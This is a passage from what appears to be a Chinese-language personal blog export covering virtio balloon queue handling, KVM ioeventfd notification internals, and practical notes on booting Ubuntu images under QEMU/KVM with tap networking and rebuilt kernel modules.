<span class=\"keyword\">sizeof</span>(__virtio16)</span><br><span class=\"line\">\t\t+ align<span class=\"number\">-1</span>) &amp; ~(align - <span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"guest\"><a href=\"#guest\" class=\"headerlink\" title=\"guest\"></a>guest</h3><p>scatterlist是内核数据结构 只是记录了page地址 并没有读数据</p>\n<p><code>sg-&gt;page_link = (unsigned long)page</code></p>\n<p>调用vring_map_one_sg-&gt;sg_phys拿到gpa记录在desc中</p>\n<p>sg-&gt;length就是buflen 即pfn个数乘长度(4字节 最多256个 共1024字节)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">desc[i].addr = vring_map_one_sg(sg)</span><br><span class=\"line\">desc[i].len = sg-&gt;length</span><br><span class=\"line\"></span><br><span class=\"line\">vring.avail-&gt;ring[avail] = i</span><br><span class=\"line\">vring.avail-&gt;idx++</span><br></pre></td></tr></table></figure>\n\n<p>这里把地址展开 其实就是sg-&gt;page_link 也就是page的地址 GPA</p>\n<p>所以这里sg用的buf 必须也是提前制定好的共享内存 相当于绕了一圈回来了 最终还是一块固定的共享内存</p>\n<p>并且sg本身存了个地址 然后又拿了地址 跟sg没什么关系 qemu这边也并不会访问到sg 只是为了复用一些函数？</p>\n<p>是virtio_balloon结构体中的pfns数组</p>\n<p>每次balloon guest把pfn写在这块固定的共享内存上(pfns) 然后把这个地址写到一个sg中 再把这个地址写到desc中 再把desc索引写到avail中 qemu从avail拿到desc索引 再拿pfns地址  传来传去就是一个固定的地址 </p>\n<h3 id=\"qemu\"><a href=\"#qemu\" class=\"headerlink\" title=\"qemu\"></a>qemu</h3><p>从avail拿到desc索引</p>\n<p>从desc拿到GPA 转成HVA</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">i = vring_avail_ring(last_avail_idx++)</span><br><span class=\"line\">vring_split_desc_read(&amp;desc,i)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">virtqueue_map_desc(desc.addr,desc.len)&#123;</span><br><span class=\"line\">\tiov[0].iov_base = dma_memory_map(desc.addr)</span><br><span class=\"line\">\tiov[0].iov_len = desc.len</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里dma_memory_map-&gt;address_space_map把GPA转为HVA 但是代码实现看起来非常复杂</p>\n<blockquote>\n<p>Map a physical memory region into a host virtual address</p>\n</blockquote>\n<p>用HVA copy guest的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">elem = virtqueue_pop(vq,sizeof(VirtQueueElement));</span><br><span class=\"line\">while(iov_to_buf(elem-&gt;out_sg,elem-&gt;out_num,offset,&amp;pfn,4)==4)</span><br><span class=\"line\"></span><br><span class=\"line\">if(offset &lt;= iov[0].iov_len)</span><br><span class=\"line\">\tmemcpy(buf,iov[0].iov_base + offset,bytes)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"used\"><a href=\"#used\" class=\"headerlink\" title=\"used\"></a>used</h3><h2 id=\"通知机制\"><a href=\"#通知机制\" class=\"headerlink\" title=\"通知机制\"></a>通知机制</h2><h3 id=\"glib\"><a href=\"#glib\" class=\"headerlink\" title=\"glib\"></a>glib</h3><p><a href=\"https://blog.csdn.net/m0_73494896/article/details/127011228\">详细介绍Glib 主事件循环轻度分析与编程应用_g_main_loop_run_极致Linux内核的博客-CSDN博客</a></p>\n<p>事件循环</p>\n<p>例如connect拿到fd  glib会包装poll 响应时dispatch调用callback</p>\n<h3 id=\"eventfd\"><a href=\"#eventfd\" class=\"headerlink\" title=\"eventfd\"></a>eventfd</h3><p><a href=\"https://zhuanlan.zhihu.com/p/40572954\">让事件飞 ——Linux eventfd 原理与实践 - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/393748176\">Linux fd 系列 — eventfd 是什么？ - 知乎 (zhihu.com)</a></p>\n<p>一个eventfd维护一个8bit的整型 write对应累加 read对应清零</p>\n<p>当值是0时read会阻塞</p>\n<p>producer用write 1 consumer用read实现阻塞</p>\n<h3 id=\"mmio\"><a href=\"#mmio\" class=\"headerlink\" title=\"mmio\"></a>mmio</h3><p><a href=\"https://mp.weixin.qq.com/s/9Zv7XcsvlVwDDjTn85-SZQ\">Linux虚拟化KVM-Qemu分析（十二）之ioeventfd与irqfd (qq.com)</a></p>\n<p><a href=\"https://blog.csdn.net/huang987246510/article/details/105618557\">qemu中的eventfd——ioeventfd_享乐主的博客-CSDN博客</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1518217\">virtIO前后端notify机制详解-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>\n<ol>\n<li>mmio的地址不能提交给kvm然后让guest访问 应该qemu来模拟，这里模拟的写操作会到<code>virtio_pci_config_write</code>处理</li>\n<li>为了提高效率 mmio的地址与eventfd绑定，kvm不需要回到qemu 而是直接通过eventfd通知qemu</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> MemoryRegionOps virtio_pci_config_ops = &#123;</span><br><span class=\"line\">    .read = virtio_pci_config_read,</span><br><span class=\"line\">    .write = virtio_pci_config_write,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_pci_bus_class_init</span><span class=\"params\">(ObjectClass *klass, <span class=\"type\">void</span> *data)</span>&#123;</span><br><span class=\"line\">\tk-&gt;set_guest_notifiers = virtio_pci_set_guest_notifiers;</span><br><span class=\"line\">    \t-&gt;virtio_pci_set_guest_notifier</span><br><span class=\"line\">            -&gt;event_notifier_init\t</span><br><span class=\"line\">            \t-&gt;eventfd</span><br><span class=\"line\">\tk-&gt;device_plugged = virtio_pci_device_plugged;</span><br><span class=\"line\">    \t-&gt;memory_region_init_io(&amp;proxy-&gt;bar, OBJECT(proxy),&amp;virtio_pci_config_ops,</span><br><span class=\"line\">\t\t\tproxy, <span class=\"string\">&quot;virtio-pci&quot;</span>, size);</span><br><span class=\"line\">    k-&gt;ioeventfd_assign = virtio_pci_ioeventfd_assign;</span><br><span class=\"line\">    \t-&gt;memory_region_add_eventfd-&gt;memory_region_transaction_commit-&gt;address_space_update_ioeventfds-&gt;address_space_add_del_ioeventfds-&gt;MEMORY_LISTEMER_CALL(eventfd_add)</span><br><span class=\"line\">            -&gt;kvm_set_ioeventfd_mmio</span><br><span class=\"line\">            \t-&gt;kvm_vm_ioctl(kvm_state, KVM_IOEVENTFD, &amp;iofd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">kvm</span><br><span class=\"line\">kvm_assign_ioeventfd_idx</span><br></pre></td></tr></table></figure>\n\n<p>qemu端 virt queue 注册handle_output<code>typedef void (*VirtIOHandleOutput)(VirtIODevice *, VirtQueue *);</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">memory_region_dispatch_write</span><br><span class=\"line\">memory_region_write_accessor</span><br><span class=\"line\">virtio_pci_config_write</span><br><span class=\"line\">virtio_ioport_write&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> VIRTIO_PCI_QUEUE_NOTIFY:</span><br><span class=\"line\">        virtio_queue_notify(vdev, val);</span><br><span class=\"line\">        \t-&gt;<span class=\"keyword\">if</span>(vq-&gt;host_notifier_enabled)</span><br><span class=\"line\">                event_notifier_set(&amp;vq-&gt;host_notifier);</span><br><span class=\"line\">    \t\t<span class=\"keyword\">else</span>\tvq-&gt;handle_output(vdev,vq)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>guest </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">virtqueue_kick</span><br><span class=\"line\">virtqueue_notify</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">vp_notify</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtqueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class=\"line\"><span class=\"comment\">\t * signal the other end */</span></span><br><span class=\"line\">\tiowrite16(vq-&gt;index, vp_dev-&gt;ldev.ioaddr + VIRTIO_PCI_QUEUE_NOTIFY);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>kvm</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_misconfig</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span>&#123;</span><br><span class=\"line\">    gpa = vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!is_guest_mode(vcpu) &amp;&amp;</span><br><span class=\"line\">\t    !kvm_io_bus_write(vcpu, KVM_FAST_MMIO_BUS, gpa, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>)) &#123;</span><br><span class=\"line\">        \t-&gt;ioeventfd_write</span><br><span class=\"line\">                -&gt;eventfd_signal (counter增加 唤醒)</span><br><span class=\"line\">        <span class=\"comment\">//正常执行返回0 提前退出</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_skip_emulated_instruction(vcpu);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里返回0 会让kvm进入下一次vcpu_run的循环 不会退出ioctl到qemu</p>\n<p>qemu在哪里等待这个eventfd  被唤醒后如何处理 网上没有相关的介绍</p>\n<blockquote>\n<p>host通知guest当然是通过注入中断的方式，首先调用的是virtio_notify，继而调用virtio_notify_vector并把中断向量作为参数传递进去。这里就调用了设备关联的notify函数，具体实现为virtio_pci_notify函数，常规中断（非MSI）会调用qemu_set_irq，在8259a中断控制器的情况下回调用kvm_pic_set_irq，然后到了kvm_set_irq，这里就会通过kvm_vm_ioctl和KVM交互，接口为KVM_IRQ_LINE，通知KVM对guest进行中断的注入。KVm里的kvm_vm_ioctl函数会对此调用进行处理，具体就是调用kvm_vm_ioctl_irq_line，之后就调用kvm_set_irq函数进行注入了。之后的流程参看中断虚拟化部分。</p>\n</blockquote>\n<p>hw&#x2F;virtio&#x2F;virtio-pci.c</p>\n<p>virio_ioport_write</p>\n<p>virtio_pci_config_ops</p>\n<p><a href=\"https://blog.csdn.net/weixin_42681961/article/details/82827911\">qemu-kvm 对mmio的模拟_qemu mmio-CSDN博客</a></p>\n<p>guest:</p>\n<p>drivers&#x2F;virtio&#x2F;virtio_pci_legacy.c</p>\n<p>vq-&gt;priv &#x3D; … VIRTIO_PCI_QUEUE_NOTIFY</p>\n<p>qemu:</p>\n<p>memory_region_add_eventfd(VIRTIO_PCI_QUEUE_NOTIFY)</p>\n<p><a href=\"read://https_blog.csdn.net/?url=https%3A%2F%2Fblog.csdn.net%2Fqq_41596356%2Farticle%2Fdetails%2F128441953\">virtio前端驱动通知机制分析 (csdn.net)</a></p>\n<p>这里说</p>\n<blockquote>\n<p><code>iowrite VIRTIO_PCI_QUEUE_NOTIFY</code> 后会产生一个 <code>vm-exit</code>，<code>KVM</code> 会判断 <code>exit_reason</code>， <code>I/O</code> 操作对应的执行函数是 <code>virtio_ioport_write()</code> 。</p>\n</blockquote>\n<p>kvm使用的eventfd来自do_eventfd  在fs&#x2F;eventfd.c</p>\n<p>qemu在哪里用？</p>\n<p><a href=\"https://tinylab.org/qemu-vhost/\">Qemu vhost 原理分析 - 泰晓科技 (tinylab.org)</a> 3.1节 有完整的调用路径 但是是需要kvm退回到qemu的 </p>\n<p>guest中balloon直接循环virtqueue_notify</p>\n<p>qemu中accel&#x2F;kvm&#x2F;kvm-all.c kvm_cpu_exec加代码统计 是mmio</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_cpu_exec</span><br><span class=\"line\">\t-&gt;address_space_rw</span><br><span class=\"line\">\t\t-&gt;address_space_write</span><br><span class=\"line\">\t\t\t-&gt;memory_region_dispatch_write</span><br></pre></td></tr></table></figure>\n\n\n\n<p>kvm</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">npf_interception</span><br><span class=\"line\">\t-&gt;kvm_mmu_page_fault</span><br><span class=\"line\">    \t-&gt;x86_emulate_instruction</span><br><span class=\"line\">            -&gt;x86_emulate_insn</span><br><span class=\"line\">                -&gt;writeback</span><br><span class=\"line\">                    -&gt;segmented_write</span><br><span class=\"line\">                        -&gt;emulator_write_emulated</span><br></pre></td></tr></table></figure>\n\n","categories":["virtualization"]},{"title":"KVM-Ubuntu","url":"/2024/09/17/virtualization/kvm-ubuntu/","content":"<h1 id=\"KVM-Ubuntu\"><a href=\"#KVM-Ubuntu\" class=\"headerlink\" title=\"KVM-Ubuntu\"></a>KVM-Ubuntu</h1><h2 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello world\"></a>hello world</h2><p><code>sys_fd = open(&quot;/dev/kvm&quot;)</code></p>\n<p>之后用<code>ioctl(fd,CMD,0)</code>给kvm发送指令</p>\n<p>fd分为kvm的sys_fd，VM的vm_fd和VCPU的vcpu_fd</p>\n<ul>\n<li><p><code>KVM_CREATE_VM</code>：创建VM 拿到VM对应的fd</p>\n</li>\n<li><p><code>KVM_SET_USER_MEMORY_REGION</code>：注册<code>kvm_userspace_memory_region</code>结构体，需要自己设置一个地址(可用mmap)作为VM地址空间的起始位置。这里VMM的一个char数组，对应到VM的整个地址空间</p>\n</li>\n<li><p><code>KVM_CREATE_VCPU</code>：用VM的fd创建VCPU，拿到fd，之后运行VM都是通过vcpu</p>\n<p>需要把拿到的fd通过mmap映射到<code>kvm_run</code>结构体上 方便拿到退出原因 io信息</p>\n</li>\n<li><p><code>KVM_SET_SREGS</code>：设置<code>kvm_sregs</code>结构体，其中包括了cr0 cr3 cr4等系统寄存器，可以自己配置页表，地址用GPA，但是PTE用HVA</p>\n</li>\n<li><p><code>KVM_RUN</code>：运行VM，VM发生exit时这句语句返回</p>\n</li>\n<li><p><code>KVM_GET_REGS</code>：拿寄存器到<code>kvm_regs</code>结构体，可通过<code>.rax</code>访问</p>\n</li>\n</ul>\n<p>输出用<code>outb</code></p>\n<p>配合</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> KVM_EXIT_IO:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vcpu-&gt;kvm_run-&gt;io.direction == KVM_EXIT_IO_OUT</span><br><span class=\"line\">\t\t&amp;&amp; vcpu-&gt;kvm_run-&gt;io.port == <span class=\"number\">0xEA</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">char</span> *p = (<span class=\"type\">char</span> *)vcpu-&gt;kvm_run;</span><br><span class=\"line\">\t\tfwrite(p + vcpu-&gt;kvm_run-&gt;io.data_offset,</span><br><span class=\"line\">\t\tvcpu-&gt;kvm_run-&gt;io.size, <span class=\"number\">1</span>, <span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">\t\tfflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h2><h3 id=\"core\"><a href=\"#core\" class=\"headerlink\" title=\"core\"></a>core</h3><p><a href=\"https://ubuntu.com/download/kvm\">Install Ubuntu Core on KVM | Ubuntu</a></p>\n<p><code>sudo qemu-system-x86_64 -smp 2 -m 2048 -net nic,model=virtio -net user,hostfwd=tcp::8022-:22,hostfwd=tcp::8090-:80 -nographic -drive file=/usr/share/OVMF/OVMF_CODE.fd,if=pflash,format=raw,unit=0,readonly=on -drive file=ubuntu-core-20-amd64.img,cache=none,format=raw,id=disk1,if=none -device virtio-blk-pci,drive=disk1,bootindex=1 -machine accel=kvm</code></p>\n<p>需要设置<code>-nographic</code>这样启动界面会在执行qemu的shell中被打印 可以输入和按回车选择</p>\n<p>这个官方镜像的启动是需要输入ubuntu账号的，并且需要在ubuntu网站中上传自己的rsa key 然后ssh登录虚拟机的时候需要</p>\n<p>启动qemu的窗口会显示无用的信息 需要另开窗口<code>ssh -p 8022 szy0127@localhost</code>登录虚拟机</p>\n<p>ubuntu官方提供的img镜像apt和dpkg都没有，连安装命令都很困难</p>\n<p>关闭qemu后虚拟机退出，重启后数据都在</p>\n<h3 id=\"cloud\"><a href=\"#cloud\" class=\"headerlink\" title=\"cloud\"></a>cloud</h3><p><a href=\"https://cloudinit.readthedocs.io/en/latest/tutorial/qemu.html\">Core tutorial with QEMU - cloud-init 23.2 documentation (cloudinit.readthedocs.io)</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-x86_64                                            \\</span><br><span class=\"line\">    -net nic                                                    \\</span><br><span class=\"line\">    -net tap,ifname=tap0,script=no,downscript=no\\</span><br><span class=\"line\">    -machine accel=kvm:tcg                                      \\</span><br><span class=\"line\">    -cpu host                                                   \\</span><br><span class=\"line\">    -m 512                                                      \\</span><br><span class=\"line\">    -nographic                                                  \\</span><br><span class=\"line\">    -hda jammy-server-cloudimg-amd64.img                        \\</span><br><span class=\"line\">    -smbios type=1,serial=ds=&#x27;nocloud-net;s=http://192.168.21.220:8000/&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-x86_64 \\</span><br><span class=\"line\">        -cpu host \\</span><br><span class=\"line\">        --enable-kvm \\</span><br><span class=\"line\">        -smp 1 \\</span><br><span class=\"line\">        -m 1G \\</span><br><span class=\"line\">        -nographic \\</span><br><span class=\"line\">        -device virtio-blk-pci,drive=vdisk \\</span><br><span class=\"line\">        -drive if=none,id=vdisk,file=jammy-server-cloudimg-amd64.img,format=qcow2 \\</span><br><span class=\"line\">        -device virtio-net-pci,netdev=vnet,mac=52:54:00:12:34:88 \\</span><br><span class=\"line\">        -netdev tap,id=vnet,ifname=tap0,script=no,downscript=no \\</span><br><span class=\"line\">        -smbios type=1,serial=ds=&#x27;nocloud-net;s=http://192.168.21.220:8000/&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>要保证IMDS webserver启动好且网络可达 user模式的<code>10.0.2.2</code> 在net模式不可用</p>\n<p>启动qemu的进程会直接打开虚拟机的shell</p>\n<p>用户名ubuntu 密码password</p>\n<p>关闭qemu后虚拟机退出，重启后数据也都在</p>\n<p>指定编译出的kernel</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-x86_64 \\</span><br><span class=\"line\">    -cpu host \\</span><br><span class=\"line\">    --enable-kvm \\</span><br><span class=\"line\">    -smp 1 \\</span><br><span class=\"line\">    -m 4G \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -kernel ./bzImage \\</span><br><span class=\"line\">    -append &quot;console=ttyS0 ignore_loglevel root=/dev/vda1&quot; \\</span><br><span class=\"line\">    -device virtio-blk-pci,drive=vdisk \\</span><br><span class=\"line\">    -drive if=none,id=vdisk,file=jammy-server-cloudimg-amd64.img,format=qcow2 \\</span><br><span class=\"line\">    -device virtio-net-pci,netdev=vnet,mac=52:54:00:12:34:88 \\</span><br><span class=\"line\">    -netdev tap,id=vnet,ifname=tap0,script=no,downscript=no \\</span><br><span class=\"line\">    #-smbios type=1,serial=ds=&#x27;nocloud-net;s=http://192.168.21.220:8000/&#x27;</span><br><span class=\"line\">    #-snapshot \\</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h2><p>ip route add default via 192.168.12.1<br>netplan apply<br>vim &#x2F;etc&#x2F;netplan&#x2F;50-cloud-init.yaml</p>\n<h3 id=\"User\"><a href=\"#User\" class=\"headerlink\" title=\"User\"></a>User</h3><p>user mode可以访问外网 但是ping被ban了</p>\n<p><a href=\"https://blog.csdn.net/m0_43406494/article/details/124827927\">QEMU–用户模式网络_qemu 网络模式_play maker的博客-CSDN博客</a></p>\n<p>host不能访问guest，guest可以访问host</p>\n<h3 id=\"tap-0\"><a href=\"#tap-0\" class=\"headerlink\" title=\"tap 0\"></a>tap 0</h3><p>没有tun模块 要自己编译以后启动</p>\n<p><a href=\"https://www.php1.cn/detail/YuanDaiMaGuanLiG_143ec260.html\">ubuntu下安装tun模块图文详细教程 - 第一PHP社区 (php1.cn)</a></p>\n<p><a href=\"https://blog.csdn.net/larryliuqing/article/details/27127843\">用TAP方式让QEMU虚拟机与host联网_qemu tap0_拉里山姆的博客-CSDN博客</a></p>\n<p>只能虚拟机和主机相互连通 虚拟机无法访问互联网</p>\n<h3 id=\"tap-1\"><a href=\"#tap-1\" class=\"headerlink\" title=\"tap 1\"></a>tap 1</h3><p><a href=\"https://gist.github.com/extremecoders-re/e8fd8a67a515fee0c873dcafc81d811c\">Setting up Qemu with a tap interface (github.com)</a></p>\n<p>虚拟机内部的网卡没有ip 如果输dhclient会卡死  原因是dhclient是跳板机 需要宿主机转发 出于安全考虑被宿主机拦截</p>\n<p>需要在宿主机上执行<code>sudo iptables -P FORWARD ACCEPT</code> 每次重启后需要再次执行</p>\n<p><code>tcpdump -i tap0</code> 看网络包流通情况</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">network:</span><br><span class=\"line\">        sudo brctl addbr br0</span><br><span class=\"line\">        sudo ip addr flush dev ens4</span><br><span class=\"line\">        sudo brctl addif br0 ens4</span><br><span class=\"line\">        sudo tunctl -t tap0 -u ubuntu</span><br><span class=\"line\">        sudo brctl addif br0 tap0</span><br><span class=\"line\">        sudo ifconfig ens4 up</span><br><span class=\"line\">        sudo ifconfig tap0 up</span><br><span class=\"line\">        sudo ifconfig br0 up</span><br><span class=\"line\">        sudo dhclient br0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>如果没有tunctl</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip tuntap add dev tap0 mod tap</span><br></pre></td></tr></table></figure>\n\n<p>如果看不见网卡 需要打开guest内核的config_virtio_net m变为y</p>\n<p>进入guest需要sudo dhclient xxx</p>\n<h2 id=\"内核信息\"><a href=\"#内核信息\" class=\"headerlink\" title=\"内核信息\"></a>内核信息</h2><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">szy@broadwell:~$ sudo ls  /sys/kernel/debug/kvm/</span><br><span class=\"line\">136814-12            halt_poll_success_ns  invlpg          max_mmu_page_hash_collisions  mmu_recycled            pf_guest</span><br><span class=\"line\">exits                halt_successful_poll  io_exits        mmio_exits                    mmu_shadow_zapped       remote_tlb_flush</span><br><span class=\"line\">fpu_reload           halt_wakeup           irq_exits       mmu_cache_miss                mmu_unsync              req_event</span><br><span class=\"line\">halt_attempted_poll  host_state_reload     irq_injections  mmu_flooded                   nmi_injections          request_irq</span><br><span class=\"line\">halt_exits           hypercalls            irq_window      mmu_pde_zapped                nmi_window              signal_exits</span><br><span class=\"line\">halt_poll_fail_ns    insn_emulation        l1d_flush       mmu_pte_updated               nx_largepages_splitted  tlb_flush</span><br><span class=\"line\">halt_poll_invalid    insn_emulation_fail   largepages      mmu_pte_write                 pf_fixed</span><br><span class=\"line\">szy@broadwell:~$ sudo ls  /sys/kernel/debug/kvm/136814-12</span><br><span class=\"line\">exits                 halt_successful_poll  io_exits                      mmio_exits       mmu_shadow_zapped       remote_tlb_flush</span><br><span class=\"line\">fpu_reload            halt_wakeup           irq_exits                     mmu_cache_miss   mmu_unsync              req_event</span><br><span class=\"line\">halt_attempted_poll   host_state_reload     irq_injections                mmu_flooded      nmi_injections          request_irq</span><br><span class=\"line\">halt_exits            hypercalls            irq_window                    mmu_pde_zapped   nmi_window              signal_exits</span><br><span class=\"line\">halt_poll_fail_ns     insn_emulation        l1d_flush                     mmu_pte_updated  nx_largepages_splitted  tlb_flush</span><br><span class=\"line\">halt_poll_invalid     insn_emulation_fail   largepages                    mmu_pte_write    pf_fixed                vcpu0</span><br><span class=\"line\">halt_poll_success_ns  invlpg                max_mmu_page_hash_collisions  mmu_recycled     pf_guest                vcpu1</span><br><span class=\"line\">szy@broadwell:~$ sudo cat  /sys/kernel/debug/kvm/136814-12/exits</span><br><span class=\"line\">5449424</span><br></pre></td></tr></table></figure>\n\n<p>文件夹名是qemu的pid</p>\n<h2 id=\"修改内核\"><a href=\"#修改内核\" class=\"headerlink\" title=\"修改内核\"></a>修改内核</h2><h3 id=\"整体编译\"><a href=\"#整体编译\" class=\"headerlink\" title=\"整体编译\"></a>整体编译</h3><p><a href=\"https://kernelnewbies.org/KernelBuild\">KernelBuild - Linux Kernel Newbies</a></p>\n<p><code>make -j8</code> 这里编译完可以拿到bzImage  给qemu的-kernel参数使用 <code>arch/x86/bzImage</code></p>\n<p><code>sudo make modules_install install</code></p>\n<p>选择kernel并重启<code>~/grublist/grub-list.py</code></p>\n<p>broadwell下tmux<code>sudo minicom -D /dev/ttyUSB0</code> 通过串口而不是ssh连bionic 即使内核或网络崩溃无法ssh也可以观察</p>\n<p>升级内核后网络设备有问题 无法访问外网且没有ip   4.15识别到enp15s0 但是需要手动dhclient拿ip 虽然拿到相同的ip，但是只有broadwell可以ping通bionic 跳板机仍然无法ping通</p>\n<p>目前成功修改的路径为<code>/usr/src/linux-source-4.15.0/linux-source-4.15.0</code> grublist显示为<code>Ubuntu, with Linux 4.15.18</code></p>\n<p>修改<code>arch/x86/kernel/paravirt.c#default_banner</code> 可以启动时看到输出 </p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230628204908934.png\" alt=\"image-20230628204908934\" style=\"zoom:50%;\" />\n\n<h3 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:22:54]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">find /lib/modules/4.15.18/ -name kvm.ko</span></span><br><span class=\"line\">/lib/modules/4.15.18/kernel/arch/x86/kvm/kvm.ko</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:31:58] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm exists</span><br><span class=\"line\">KVM acceleration can be used</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:05]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo rmmod kvm-intel</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:12]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo rmmod kvm</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:14]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm does not exist</span><br><span class=\"line\">HINT:   sudo modprobe kvm_intel</span><br><span class=\"line\">INFO: For more detailed results, you should run this as root</span><br><span class=\"line\">HINT:   sudo /usr/sbin/kvm-ok</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:18] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo insmod /lib/modules/4.15.18/kernel/arch/x86/kvm/kvm.ko</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:25]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo insmod /lib/modules/4.15.18/kernel/arch/x86/kvm/kvm-intel.ko</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:31]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm exists</span><br><span class=\"line\">KVM acceleration can be used</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm [21:00:33] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo insmod 